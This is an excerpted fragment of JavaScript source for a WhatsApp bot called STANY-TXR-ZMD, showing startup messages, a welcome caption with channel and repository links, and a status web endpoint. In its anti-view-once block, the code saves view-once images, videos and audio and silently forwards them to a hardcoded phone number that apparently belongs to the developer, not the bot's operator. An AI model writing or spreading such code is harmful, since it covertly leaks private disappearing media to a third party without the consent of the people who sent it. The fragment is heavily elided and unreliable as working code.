...
console.log("Session downloaded ✅")
  ...
  console.log("Connecting STANY-TXR-ZMD to WhatsApp ⏳️...");
  ...
  console.log('🧬 Installing STANY-TXR-ZMD Plugins')
  const path = require('path');
  ...
  let up = `*Hello there STANY-TXR-ZMD ✦ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by STANY-TECH INC. \ud83c\udf8a, Meet ✦ STANY-TXR-ZMD ✦ WhatsApp Bot.\n\n *Thanks for using ✦ STANY-TXR-ZMD ✦ \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://whatsapp.com/channel/0029VakUEfb4o7qVdkwPk83E\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Stanking11/STANY-TXR-ZMD\n\n> © Powered BY ✦ STANY-TECH ✦ \ud83d\udda4`;
  conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/0ydsic.jpeg` }, caption: up })
  }
  })
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("255794481386@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("255794481386@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (jawadik.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
    return conn.sendMessage("255794481386@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
  ...
  */
  ...
  if(senderNumber.includes("255794481386")){
  if(isReact) return
  m.react("👻")
  }
...
if (!isReact && senderNumber === botNumber) {
  ...
  app.get("/", (req, res) => {
  res.send("STANY-TXR-ZMD RUNNING✅");
  });
